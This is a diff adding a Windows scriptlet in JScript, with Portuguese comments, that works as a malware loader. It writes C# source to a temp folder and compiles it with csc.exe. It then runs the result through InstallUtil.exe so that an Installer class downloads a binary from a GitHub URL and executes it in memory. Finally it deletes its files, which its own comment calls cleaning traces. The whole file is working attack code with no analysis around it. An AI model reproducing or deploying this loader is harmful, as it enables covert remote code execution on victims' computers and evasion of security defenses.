@@ -1,0 +1,56 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration progid="INSTALL" classid="{A0000000-1111-2222-3333-444444444444}">
+<script language="JScript">
+<![CDATA[
+    var shell = new ActiveXObject("WScript.Shell");
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    
+    // Código C# do loader
+    var code = 
+        "using System;" +
+        "using System.Net;" +
+        "using System.Reflection;" +
+        "using System.ComponentModel;" +
+        "using System.Configuration.Install;" +
+        "[RunInstaller(true)]" +
+        "public class MemLoader : Installer {" +
+        "public override void Install(System.Collections.IDictionary savedState) {" +
+        "base.Install(savedState);" +
+        "var w = new WebClient();" +
+        "var b = w.DownloadData(\\\"https://github.com/vendetta1533/quebrocamabox/raw/refs/heads/main/_CL_ca81588a8251bb861d091ddf2f17d5f9db.node\\\");" +
+        "var a = Assembly.Load(b);" +
+        "a.EntryPoint.Invoke(null, new object[]{});" +
+        "}" +
+        "public static void Main(){}" +
+        "}";
+    
+    // Salva como .cs temporário
+    var tempFile = fso.GetSpecialFolder(2) + "\\" + fso.GetTempName() + ".cs";
+    var ts = fso.CreateTextFile(tempFile, true);
+    ts.Write(code);
+    ts.Close();
+    
+    // Caminho do csc.exe
+    var csc = shell.ExpandEnvironmentStrings("%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe");
+    
+    // DLL de saída
+    var tempDll = fso.GetSpecialFolder(2) + "\\" + fso.GetTempName() + ".dll";
+    
+    // Compila o .cs em .dll
+    shell.Run("\"" + csc + "\" /target:library /reference:System.Configuration.Install.dll /out:\"" + tempDll + "\" \"" + tempFile + "\"", 0, true);
+    
+    // InstallUtil carrega a DLL e executa o Installer
+    var installutil = shell.ExpandEnvironmentStrings("%windir%\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe");
+    shell.Run("\"" + installutil + "\" /logfile= /LogToConsole=false \"" + tempDll + "\"", 0, false);
+    
+    // Espera executar
+    WScript.Sleep(3000);
+    
+    // Limpa rastros
+    try { fso.DeleteFile(tempFile); } catch(e) {}
+    try { fso.DeleteFile(tempDll); } catch(e) {}
+]]>
+</script>
+</registration>
+</scriptlet>
